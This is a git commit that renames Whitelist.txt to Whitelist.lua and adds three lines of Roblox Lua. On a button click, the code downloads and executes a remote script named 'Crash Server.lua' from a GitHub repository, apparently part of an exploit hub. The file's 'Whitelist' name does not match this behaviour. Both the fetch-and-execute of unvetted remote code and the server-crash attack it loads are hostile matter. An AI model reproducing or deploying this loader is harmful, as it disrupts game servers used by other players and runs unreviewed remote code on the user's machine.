5a99b4b8266a5af074fc94b62b22ae46a1a71edf
Kero.exe <100468878+Kerutzuu@users.noreply.github.com>
2025-08-22 09:06:38 +0200

    Update and rename Whitelist.txt to Whitelist.lua

---
+++ Whitelist.lua
@@ -0,0 +1,3 @@
+script.Parent.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kerutzuu/Scripturi-TNTHUB/refs/heads/main/Crash%20Server.lua", true))()
+end)
